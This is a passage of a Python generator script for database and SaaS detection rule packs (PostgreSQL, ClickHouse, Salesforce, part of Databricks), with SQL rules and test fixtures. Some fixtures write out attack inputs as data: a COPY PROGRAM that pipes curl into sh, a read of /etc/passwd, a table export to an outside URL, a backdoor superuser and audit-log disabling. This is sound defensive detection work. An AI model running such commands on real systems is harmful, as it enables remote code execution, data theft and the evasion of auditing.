        rule("DBX-005", "Secret harvesting", 4, "TA0006", "T1552", "DATABASE_ACTIVITY",
             "Twenty or more getSecret calls by one user in 15 minutes.",
             sel("DATABASE_ACTIVITY", "databricks", "'getSecret ' || COALESCE(_raw:requestParams:key::VARCHAR, '')",
                 "result = 'success' AND action = 'getSecret'"),
             [DB("secrets", "getSecret", count=20, params={"scope": "prod", "key": "db-pass"})],
             [DB("secrets", "getSecret", count=3, params={"scope": "prod", "key": "db-pass"})], threshold=20, window=15),
        rule("DBX-006", "Repeated login failures", 3, "TA0006", "T1110", "DATABASE_ACTIVITY",
             "Ten or more failed logins or token logins for one user in 15 minutes.",
             sel("DATABASE_ACTIVITY", "databricks", "'Login failed: ' || query_type",
                 "result = 'failure' AND action IN ('login', 'tokenLogin', 'samlLogin', 'oidcBrowserLogin')"),
             [DB("accounts", "login", count=10, status=401)], [DB("accounts", "login", count=2, status=401)],
             threshold=10, window=15),
        rule("DBX-007", "Unity Catalog grant to all users", 3, "TA0004", "T1098", "DATABASE_ACTIVITY",
             "Privileges granted to account users / users, exposing data to everyone.",
             sel("DATABASE_ACTIVITY", "databricks", "'Broad grant on ' || COALESCE(object, '?')",
                 "result = 'success' AND action = 'updatePermissions' AND (query_text ILIKE '%account users%' "
                 "OR query_text ILIKE '%\"principal\":\"users\"%')"),
             [DB("unityCatalog", "updatePermissions", params={"full_name_arg": "main.hr.salaries",
                 "changes": [{"principal": "account users", "add": ["SELECT"]}]})],
             [DB("unityCatalog", "updatePermissions", params={"full_name_arg": "main.hr.salaries",
                 "changes": [{"principal": "hr-team", "add": ["SELECT"]}]})]),
        rule("DBX-008", "Delta Sharing to a new recipient", 4, "TA0010", "T1537", "DATABASE_ACTIVITY",
             "A share recipient was created or a share was extended.",
             sel("DATABASE_ACTIVITY", "databricks", "query_type || ': ' || COALESCE(object, '?')",
                 "result = 'success' AND action IN ('createRecipient', 'updateShare', 'updateSharePermissions')"),
             [DB("unityCatalog", "createRecipient", params={"name": "partner-x"})],
             [DB("unityCatalog", "getRecipient", params={"name": "partner-x"})]),
        rule("DBX-009", "Verbose audit logging disabled", 4, "TA0005", "T1562.008", "DATABASE_ACTIVITY",
             "enableVerboseAuditLogs turned off: command-level auditing stops.",
             sel("DATABASE_ACTIVITY", "databricks", "'Verbose audit logs disabled by ' || user_name",
                 "result = 'success' AND action = 'workspaceConfEdit' AND query_text ILIKE '%enableVerboseAuditLogs%' "
                 "AND query_text ILIKE '%false%'"),
             [DB("workspace", "workspaceConfEdit", params={"workspaceConfKeys": "enableVerboseAuditLogs", "workspaceConfValues": "false"})],
             [DB("workspace", "workspaceConfEdit", params={"workspaceConfKeys": "enableVerboseAuditLogs", "workspaceConfValues": "true"})]),
    ],
}

# ------------------------------------------------------------------ PostgreSQL
def pga(cls, cmd, stmt, obj_type="", obj="", user=E):
    return {"timestamp": None, "user": user, "dbname": "prod", "remote_host": "10.20.0.5:51234",
            "application_name": "psql", "error_severity": "LOG", "state_code": "00000", "session_id": "s1",
            "message": f"AUDIT: SESSION,1,1,{cls},{cmd},{obj_type},{obj},{stmt},<not logged>"}


def pgauth(ok=False, user=E, host="10.20.0.9"):
    if ok:
        return {"user": user, "dbname": "prod", "remote_host": f"{host}:5000", "error_severity": "LOG",
                "state_code": "00000", "message": f"connection authorized: user={user} database=prod"}
    return {"user": user, "dbname": "prod", "remote_host": f"{host}:5000", "error_severity": "FATAL",
            "state_code": "28P01", "message": f"password authentication failed for user \"{user}\""}


PG = lambda body, count=1, offset=1: otel("postgres", body, count=count, offset=offset)
PGW = "vendor_product = 'postgres'"

POSTGRES = {
    "pack_id": "postgres", "name": "PostgreSQL", "vendor": "PostgreSQL", "version": 1,
    "description": "pgaudit and authentication detections: superuser grants, brute force, COPY ... PROGRAM command "
                   "execution, bulk exports, audit tampering, dangerous extensions, mass destruction, server file access "
                   "and new client hosts.",
    "requires": [{"table": "DATABASE_ACTIVITY", "vendor_product": "postgres"}],
    "onboarding": "Enable pgaudit (pgaudit.log = 'ddl, role, write, misc') and log_destination = 'jsonlog', then tail "
                  "the jsonlog with otel-receiver/collector-examples/postgres.yaml (filelog receiver), service.name postgres.",
    "rules": [
        rule("PG-001", "Superuser role created or granted", 5, "TA0004", "T1098", "DATABASE_ACTIVITY",
             "CREATE/ALTER ROLE ... SUPERUSER, or membership in pg_execute_server_program / rds_superuser.",
             sel("DATABASE_ACTIVITY", "postgres", "'Superuser change by ' || user_name || ': ' || LEFT(query_text, 200)",
                 "result = 'success' AND query_type IN ('CREATE ROLE', 'ALTER ROLE', 'GRANT') AND REGEXP_LIKE(query_text, "
                 "'.*([[:space:]]SUPERUSER|pg_execute_server_program|pg_write_server_files|rds_superuser|azure_pg_admin).*', 'is')"),
             [PG(pga("ROLE", "CREATE ROLE", "CREATE ROLE backdoor SUPERUSER LOGIN PASSWORD 'x'"))],
             [PG(pga("ROLE", "CREATE ROLE", "CREATE ROLE reporting NOSUPERUSER LOGIN"))]),
        rule("PG-002", "PostgreSQL password brute force", 4, "TA0006", "T1110", "DATABASE_ACTIVITY",
             "Ten or more password failures (28P01) for one user from one host in 10 minutes.",
             sel("DATABASE_ACTIVITY", "postgres", "'Auth failed: ' || COALESCE(reason, '')",
                 "action = 'login' AND result = 'failure'"),
             [PG(pgauth(), count=10)], [PG(pgauth(), count=3)], threshold=10, window=10),
        rule("PG-003", "COPY ... PROGRAM (command execution)", 5, "TA0002", "T1059", "DATABASE_ACTIVITY",
             "COPY TO/FROM PROGRAM runs OS commands as the postgres user.",
             sel("DATABASE_ACTIVITY", "postgres", "'COPY PROGRAM: ' || LEFT(query_text, 200)",
                 "REGEXP_LIKE(query_text, '.*COPY[[:space:]].*(TO|FROM)[[:space:]]+PROGRAM.*', 'is')"),
             [PG(pga("WRITE", "COPY", "COPY t FROM PROGRAM 'curl -s http://203.0.113.9/x | sh'"))],
             [PG(pga("WRITE", "COPY", "COPY t FROM STDIN"))]),
        rule("PG-004", "Table exported with COPY TO", 3, "TA0009", "T1005", "DATABASE_ACTIVITY",
             "COPY ... TO a file or STDOUT: bulk export of a table.",
             sel("DATABASE_ACTIVITY", "postgres", "'Export: ' || LEFT(query_text, 200)",
                 "result = 'success' AND query_type = 'COPY' AND REGEXP_LIKE(query_text, '.*[[:space:]]TO[[:space:]]+(STDOUT|.[/]).*', 'is')"),
             [PG(pga("READ", "COPY", "COPY customers TO STDOUT WITH CSV HEADER", "TABLE", "public.customers"))],
             [PG(pga("WRITE", "COPY", "COPY staging FROM STDIN", "TABLE", "public.staging"))],
             fp="Backups and ETL using COPY (filter their users)."),
        rule("PG-005", "Audit logging tampered with", 5, "TA0005", "T1562.001", "DATABASE_ACTIVITY",
             "pgaudit dropped or logging settings reduced.",
             sel("DATABASE_ACTIVITY", "postgres", "'Audit tampering: ' || LEFT(query_text, 200)",
                 "REGEXP_LIKE(query_text, '.*(DROP[[:space:]]+EXTENSION[[:space:]]+(IF[[:space:]]+EXISTS[[:space:]]+)?pgaudit|"
                 "pgaudit[.]log[[:space:]]*(=|TO)[[:space:]]*.none|log_statement[[:space:]]*(=|TO)[[:space:]]*.none|"
                 "SET[[:space:]]+pgaudit[.]log).*', 'is')"),
             [PG(pga("MISC", "ALTER SYSTEM", "ALTER SYSTEM SET pgaudit.log = 'none'"))],
             [PG(pga("MISC", "ALTER SYSTEM", "ALTER SYSTEM SET work_mem = '64MB'"))]),
        rule("PG-006", "Dangerous extension created", 4, "TA0003", "T1505", "DATABASE_ACTIVITY",
             "Untrusted languages and file/remote-access extensions enable code execution or data movement.",
             sel("DATABASE_ACTIVITY", "postgres", "'Extension: ' || LEFT(query_text, 200)",
                 "result = 'success' AND query_type = 'CREATE EXTENSION' AND REGEXP_LIKE(query_text, "
                 "'.*(plpython3?u|plperlu|pltclu|dblink|adminpack|file_fdw|postgres_fdw|lo_|plsh).*', 'is')"),
             [PG(pga("DDL", "CREATE EXTENSION", "CREATE EXTENSION plpython3u"))],
             [PG(pga("DDL", "CREATE EXTENSION", "CREATE EXTENSION pg_trgm"))]),
        rule("PG-007", "Mass table destruction", 4, "TA0040", "T1485", "DATABASE_ACTIVITY",
             "Five or more DROP TABLE / TRUNCATE statements by one user in 10 minutes.",
             sel("DATABASE_ACTIVITY", "postgres", "query_type || ' ' || COALESCE(object, '')",
                 "result = 'success' AND query_type IN ('DROP TABLE', 'TRUNCATE TABLE', 'DROP SCHEMA', 'DROP DATABASE')"),
             [PG(pga("DDL", "DROP TABLE", "DROP TABLE orders_{{n}}", "TABLE", "public.orders_{{n}}"), count=6)],
             [PG(pga("DDL", "DROP TABLE", "DROP TABLE tmp_{{n}}", "TABLE", "public.tmp_{{n}}"), count=2)],
             threshold=5, window=10),
        rule("PG-008", "Server file access functions", 4, "TA0007", "T1083", "DATABASE_ACTIVITY",
             "pg_read_file, pg_ls_dir, lo_import/lo_export read or write files on the database server.",
             sel("DATABASE_ACTIVITY", "postgres", "'Server file access: ' || LEFT(query_text, 200)",
                 "REGEXP_LIKE(query_text, '.*(pg_read_file|pg_read_binary_file|pg_ls_dir|lo_import|lo_export|pg_stat_file)"
                 "[[:space:]]*[(].*', 'is')"),
             [PG(pga("READ", "SELECT", "SELECT pg_read_file('/etc/passwd')"))],
             [PG(pga("READ", "SELECT", "SELECT count(*) FROM orders"))]),
        rule("PG-009", "Login from a new client host", 2, "TA0001", "T1078", "DATABASE_ACTIVITY",
             "Successful connection from a host the user has not connected from in 30 days.",
             "SELECT n._time, n.user_name, n.src, n.dest, 'First connection from ' || n.src AS description\n"
             "FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY n\n"
             "WHERE n.vendor_product = 'postgres' AND n.action = 'login' AND n.result = 'success'\n"
             "  AND n._time > DATEADD('minute', -240, CURRENT_TIMESTAMP())\n"
             "  AND EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY h WHERE h.vendor_product = 'postgres'\n"
             "              AND h.action = 'login' AND h.result = 'success' AND h.user_name = n.user_name\n"
             "              AND h._time BETWEEN DATEADD('day', -30, n._time) AND DATEADD('day', -1, n._time))\n"
             "  AND NOT EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY h WHERE h.vendor_product = 'postgres'\n"
             "              AND h.action = 'login' AND h.result = 'success' AND h.user_name = n.user_name AND h.src = n.src\n"
             "              AND h._time BETWEEN DATEADD('day', -30, n._time) AND DATEADD('minute', -240, CURRENT_TIMESTAMP()))",
             [PG(pgauth(ok=True, host="10.20.0.9"), offset=7200), PG(pgauth(ok=True, host="203.0.113.77"))],
             [PG(pgauth(ok=True, host="10.20.0.9"), offset=7200), PG(pgauth(ok=True, host="10.20.0.9"))]),
    ],
}

# ------------------------------------------------------------------ ClickHouse
def chq(kind, query, typ="QueryFinish", user=E, read_rows=10, result_rows=10, exc=None, tables=None):
    b = {"type": typ, "user": user, "address": "::ffff:10.30.0.7", "query_kind": kind, "query": query,
         "read_rows": read_rows, "result_rows": result_rows, "read_bytes": read_rows * 100, "client_name": "clickhouse-client",
         "query_id": "q1", "tables": tables or ["default.events"]}
    if exc:
        b["exception"] = exc
    return b


CH = lambda *a, count=1, **k: otel("clickhouse", chq(*a, **k), count=count)

CLICKHOUSE = {
    "pack_id": "clickhouse", "name": "ClickHouse", "vendor": "ClickHouse", "version": 1,
    "description": "ClickHouse query_log detections: broad grants, authentication bursts, exfiltration through "
                   "url()/s3()/remote() or INTO OUTFILE, very large reads, mass drops, credential reconnaissance, "
                   "access-denied storms and query-log tampering.",
    "requires": [{"table": "DATABASE_ACTIVITY", "vendor_product": "clickhouse"}],
    "onboarding": "Run otel-receiver/collector-examples/clickhouse_forwarder.py (reads system.query_log incrementally), "
                  "service.name clickhouse.",
    "rules": [
        rule("CH-001", "ALL privileges granted", 4, "TA0004", "T1098", "DATABASE_ACTIVITY",
             "GRANT ALL / GRANT ... WITH GRANT OPTION or access_management for a user or role.",
             sel("DATABASE_ACTIVITY", "clickhouse", "'Broad grant: ' || LEFT(query_text, 200)",
                 "result = 'success' AND query_type = 'GRANT' AND REGEXP_LIKE(query_text, "
                 "'.*(GRANT[[:space:]]+ALL|WITH[[:space:]]+GRANT[[:space:]]+OPTION|ACCESS[[:space:]]+MANAGEMENT).*', 'is')"),
             [CH("Grant", "GRANT ALL ON *.* TO backdoor WITH GRANT OPTION")],
             [CH("Grant", "GRANT SELECT ON analytics.* TO reporting")]),
        rule("CH-002", "ClickHouse authentication failures", 4, "TA0006", "T1110", "DATABASE_ACTIVITY",
             "Ten or more AUTHENTICATION_FAILED (516) errors for one user and source in 10 minutes.",
             sel("DATABASE_ACTIVITY", "clickhouse", "'Auth failed: ' || LEFT(COALESCE(reason, ''), 150)",
                 "result = 'failure' AND (reason ILIKE '%AUTHENTICATION_FAILED%' OR reason ILIKE 'Code: 516%')"),
             [CH("Select", "SELECT 1", typ="ExceptionBeforeStart", exc="Code: 516. DB::Exception: AUTHENTICATION_FAILED", count=10)],
             [CH("Select", "SELECT 1", typ="ExceptionBeforeStart", exc="Code: 516. DB::Exception: AUTHENTICATION_FAILED", count=2)],
             threshold=10, window=10),
        rule("CH-003", "Data sent out through table functions", 4, "TA0010", "T1567", "DATABASE_ACTIVITY",
             "INSERT INTO FUNCTION url()/s3()/remote() or SELECT ... INTO OUTFILE.",
             sel("DATABASE_ACTIVITY", "clickhouse", "'External write: ' || LEFT(query_text, 200)",
                 "result = 'success' AND REGEXP_LIKE(query_text, '.*(INTO[[:space:]]+FUNCTION[[:space:]]+(url|s3|remote|"
                 "remoteSecure|mysql|postgresql)[[:space:]]*[(]|INTO[[:space:]]+OUTFILE).*', 'is')"),
             [CH("Insert", "INSERT INTO FUNCTION url('https://203.0.113.9/up', 'CSV') SELECT * FROM users")],
             [CH("Insert", "INSERT INTO events SELECT * FROM staging_events")]),
        rule("CH-004", "Very large read", 3, "TA0009", "T1213", "DATABASE_ACTIVITY",
             "A query read 100M+ rows or returned 1M+ rows.",
             sel("DATABASE_ACTIVITY", "clickhouse", "user_name || ' read ' || COALESCE(_raw:read_rows::VARCHAR, '?') || ' rows from ' || COALESCE(object, '?')",
                 "result = 'success' AND (COALESCE(_raw:read_rows::NUMBER, 0) >= 100000000 OR COALESCE(rows_affected, 0) >= 1000000)"),
             [CH("Select", "SELECT * FROM users", read_rows=150000000, result_rows=150000000)],
             [CH("Select", "SELECT count() FROM users", read_rows=5000000, result_rows=1)],
             fp="Scheduled aggregations by service users."),
        rule("CH-005", "Mass drop or truncate", 4, "TA0040", "T1485", "DATABASE_ACTIVITY",
             "Five or more DROP / TRUNCATE statements by one user in 10 minutes.",
             sel("DATABASE_ACTIVITY", "clickhouse", "LEFT(query_text, 150)",
                 "result = 'success' AND query_type = 'DROP' OR (vendor_product = 'clickhouse' AND result = 'success' "
                 "AND REGEXP_LIKE(query_text, '^[[:space:]]*TRUNCATE.*', 'is'))"),
             [CH("Drop", "DROP TABLE logs_{{n}}", count=6)], [CH("Drop", "DROP TABLE tmp_{{n}}", count=2)],
             threshold=5, window=10),
        rule("CH-006", "Credential and grant reconnaissance", 2, "TA0007", "T1087", "DATABASE_ACTIVITY",
             "Five or more queries against system.users / system.grants / system.role_grants in 10 minutes.",
             sel("DATABASE_ACTIVITY", "clickhouse", "'Recon: ' || LEFT(query_text, 150)",
                 "REGEXP_LIKE(query_text, '.*system[.](users|grants|role_grants|quotas|settings_profiles).*', 'is')"),
             [CH("Select", "SELECT * FROM system.grants", count=5)], [CH("Select", "SELECT * FROM system.grants", count=1)],
             threshold=5, window=10),
        rule("CH-007", "Access-denied storm", 3, "TA0007", "T1069", "DATABASE_ACTIVITY",
             "Twenty or more ACCESS_DENIED (497) errors for one user in 15 minutes.",
             sel("DATABASE_ACTIVITY", "clickhouse", "'Denied: ' || LEFT(COALESCE(reason, ''), 150)",
                 "result = 'failure' AND (reason ILIKE '%ACCESS_DENIED%' OR reason ILIKE 'Code: 497%')"),
             [CH("Select", "SELECT * FROM finance.ledger", typ="ExceptionBeforeStart", exc="Code: 497. DB::Exception: ACCESS_DENIED", count=20)],
             [CH("Select", "SELECT * FROM finance.ledger", typ="ExceptionBeforeStart", exc="Code: 497. DB::Exception: ACCESS_DENIED", count=3)],
             threshold=20, window=15),
        rule("CH-008", "Query logging disabled", 4, "TA0005", "T1562", "DATABASE_ACTIVITY",
             "log_queries turned off for a session, profile or user.",
             sel("DATABASE_ACTIVITY", "clickhouse", "'Query log disabled: ' || LEFT(query_text, 150)",
                 "REGEXP_LIKE(query_text, '.*log_queries[[:space:]]*=[[:space:]]*(0|false).*', 'is')"),
             [CH("Alter", "ALTER SETTINGS PROFILE default SETTINGS log_queries = 0")],
             [CH("Alter", "ALTER SETTINGS PROFILE default SETTINGS log_queries = 1")]),
    ],
}

# ------------------------------------------------------------------ Salesforce
def sf(event, user=E, ip="198.51.100.70", **k):
    return {"EventType": event, "Username": f"{user}@corp.example", "SourceIp": ip, "OrganizationId": "00D1", **k}


SFX = lambda event, count=1, offset=1, **k: otel("salesforce", sf(event, **k), count=count, offset=offset)

SALESFORCE = {
    "pack_id": "salesforce", "name": "Salesforce", "vendor": "Salesforce", "version": 1,
    "description": "Salesforce event monitoring and setup audit trail detections: mass report exports and API "
                   "queries, login brute force, new-country logins, admin permission grants, connected-app changes, "
                   "network and session security weakening, and login-as impersonation.",
    "requires": [{"table": "DATABASE_ACTIVITY", "vendor_product": "salesforce"}],
    "onboarding": "Run otel-receiver/collector-examples/salesforce_forwarder.py (Real-Time Event Monitoring "
                  "LoginEvent/ReportEvent/ApiEvent and SetupAuditTrail), service.name salesforce.",
    "rules": [
        rule("SFDC-001", "Mass report export", 4, "TA0009", "T1213", "DATABASE_ACTIVITY",
             "A report export of 10,000 rows or more.",
             sel("DATABASE_ACTIVITY", "salesforce", "'Report ' || COALESCE(object, '?') || ' exported: ' || rows_affected || ' rows'",
                 "action = 'report' AND query_type IN ('ReportExported', 'ReportExportedAsync') AND rows_affected >= 10000"),
             [SFX("ReportEvent", Operation="ReportExported", RowsProcessed=250000, ReportId="00O1")],
             [SFX("ReportEvent", Operation="ReportExported", RowsProcessed=120, ReportId="00O1")],
             fp="Finance month-end exports."),
        rule("SFDC-002", "Mass API data pull", 4, "TA0009", "T1213", "DATABASE_ACTIVITY",
             "An API or Bulk API query returned 100,000 rows or more.",
             sel("DATABASE_ACTIVITY", "salesforce", "'API pull of ' || rows_affected || ' rows: ' || LEFT(COALESCE(query_text, ''), 150)",
                 "action IN ('api', 'bulk_api') AND rows_affected >= 100000"),
             [SFX("ApiEvent", Operation="Query", RowsProcessed=500000, Query="SELECT Id, Email FROM Contact")],
             [SFX("ApiEvent", Operation="Query", RowsProcessed=50, Query="SELECT Id FROM Account LIMIT 50")],
             fp="Integration users syncing to a warehouse."),
        rule("SFDC-003", "Salesforce login brute force", 3, "TA0006", "T1110", "DATABASE_ACTIVITY",
             "Ten or more failed logins for one user from one source in 15 minutes.",
             sel("DATABASE_ACTIVITY", "salesforce", "'Login failed: ' || COALESCE(reason, '')",
                 "action = 'login' AND result = 'failure'"),
             [SFX("LoginEvent", Status="Invalid Password", LoginType="Application", count=10)],
             [SFX("LoginEvent", Status="Invalid Password", LoginType="Application", count=2)], threshold=10, window=15),
        rule("SFDC-004", "Salesforce login from a new country", 2, "TA0001", "T1078.004", "DATABASE_ACTIVITY",
             "Successful login from a country the user has not logged in from in 30 days.",
             "SELECT n._time, n.user_name, n.src, n.dest, 'Login from new country ' || n._raw:Country::VARCHAR AS description\n"
             "FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY n\n"
             "WHERE n.vendor_product = 'salesforce' AND n.action = 'login' AND n.result = 'success'\n"
             "  AND n._raw:Country IS NOT NULL AND n._time > DATEADD('minute', -240, CURRENT_TIMESTAMP())\n"
             "  AND EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY h WHERE h.vendor_product = 'salesforce'\n"
             "              AND h.action = 'login' AND h.result = 'success' AND h.user_name = n.user_name\n"
             "              AND h._time BETWEEN DATEADD('day', -30, n._time) AND DATEADD('day', -1, n._time))\n"
             "  AND NOT EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY h WHERE h.vendor_product = 'salesforce'\n"
             "              AND h.action = 'login' AND h.result = 'success' AND h.user_name = n.user_name\n"
             "              AND h._raw:Country::VARCHAR = n._raw:Country::VARCHAR\n"
             "              AND h._time BETWEEN DATEADD('day', -30, n._time) AND DATEADD('minute', -240, CURRENT_TIMESTAMP()))",
             [SFX("LoginEvent", Status="Success", Country="Germany", offset=7200), SFX("LoginEvent", Status="Success", Country="Brazil")],
             [SFX("LoginEvent", Status="Success", Country="Germany", offset=7200), SFX("LoginEvent", Status="Success", Country="Germany")],
             fp="Travel."),
        rule("SFDC-005", "Admin permissions granted", 5, "TA0004", "T1098.003", "DATABASE_ACTIVITY",
             "Modify All Data / View All Data / System Administrator granted through a permission set or profile change.",
             sel("DATABASE_ACTIVITY", "salesforce", "'Admin grant: ' || LEFT(COALESCE(query_text, ''), 200)",
                 "action = 'setup' AND (query_text ILIKE '%Modify All Data%' OR query_text ILIKE '%View All Data%' "
                 "OR query_text ILIKE '%System Administrator%' OR query_text ILIKE '%Author Apex%')"),
             [SFX("SetupAuditTrail", Action="PermSetAssign", Section="Manage Users",
                  Display="Permission set Super Admin: assigned to user eve (Modify All Data)")],
             [SFX("SetupAuditTrail", Action="PermSetAssign", Section="Manage Users",
                  Display="Permission set Sales Reports: assigned to user eve")]),
        rule("SFDC-006", "Connected app created or OAuth policy relaxed", 4, "TA0006", "T1528", "DATABASE_ACTIVITY",
             "Connected apps get OAuth tokens to org data; relaxed IP / refresh policies make them durable.",
             sel("DATABASE_ACTIVITY", "salesforce", "'Connected app change: ' || LEFT(COALESCE(query_text, ''), 200)",
                 "action = 'setup' AND object ILIKE '%Connected Apps%'"),
             [SFX("SetupAuditTrail", Action="createdConnectedApp", Section="Connected Apps",
                  Display="Created connected app Data Sync Helper")],
             [SFX("SetupAuditTrail", Action="changedUserEmail", Section="Manage Users", Display="Changed email for eve")]),
        rule("SFDC-007", "Network or session security weakened", 4, "TA0005", "T1562.007", "DATABASE_ACTIVITY",
             "Trusted IP ranges, login IP ranges or session security settings changed.",
             sel("DATABASE_ACTIVITY", "salesforce", "'Security setting change: ' || LEFT(COALESCE(query_text, ''), 200)",
                 "action = 'setup' AND (object ILIKE '%Network Access%' OR object ILIKE '%Session Settings%' "
                 "OR query_text ILIKE '%login IP range%')"),
             [SFX("SetupAuditTrail", Action="ipRangeCreated", Section="Network Access",
                  Display="Added trusted IP range 0.0.0.0 to 255.255.255.255")],
             [SFX("SetupAuditTrail", Action="changedProfile", Section="Manage Users", Display="Changed profile for eve")]),
        rule("SFDC-008", "Login-as impersonation", 3, "TA0004", "T1078", "DATABASE_ACTIVITY",
             "An administrator logged in as another user.",
             sel("DATABASE_ACTIVITY", "salesforce", "'Login as: ' || LEFT(COALESCE(query_text, query_type), 200)",
                 "(action = 'setup' AND query_type IN ('suOrgAdminLogin', 'suNetworkAdminLogin')) OR "
                 "(vendor_product = 'salesforce' AND action = 'login' AND query_type ILIKE '%Login As%')"),
             [SFX("SetupAuditTrail", Action="suOrgAdminLogin", Section="Manage Users", Display="Logged in as user ceo")],
             [SFX("SetupAuditTrail", Action="suOrgAdminLogout", Section="Manage Users", Display="Logged out of user ceo")]),
    ],
}


def dump(pack):
    out = ["# Generated by scripts/gen_rule_packs.py - edit there, then re-run it.",
           f"pack_id: {pack['pack_id']}", f"name: {pack['name']}", f"vendor: {pack['vendor']}",
           f"version: {pack['version']}", f"description: {json.dumps(pack['description'])}",
           f"requires: {json.dumps(pack['requires'])}", f"onboarding: {json.dumps(pack['onboarding'])}", "rules:"]
    for r in pack["rules"]:
        out.append(f"  - id: {r['id']}")
        for k in ("name", "description", "severity", "tactic", "technique", "table", "threshold", "window_minutes",
                  "lookback_minutes", "expected_latency_seconds", "false_positives", "references", "fixtures"):
            if k in r:
                out.append(f"    {k}: {json.dumps(r[k])}")
        out.append("    sql: |")
        out += ["      " + line for line in r["sql"].splitlines()]
        out.append("")
    return "\n".join(out) + "\n"


if __name__ == "__main__":
    for p in (AWS, ENTRA, OKTA, DATABRICKS, POSTGRES, CLICKHOUSE, SALESFORCE):
        d = ROOT / "rule-packs" / p["pack_id"]
        d.mkdir(parents=True, exist_ok=True)
        (d / "pack.yaml").write_text(dump(p))
        print(f"{p['pack_id']}: {len(p['rules'])} rules")
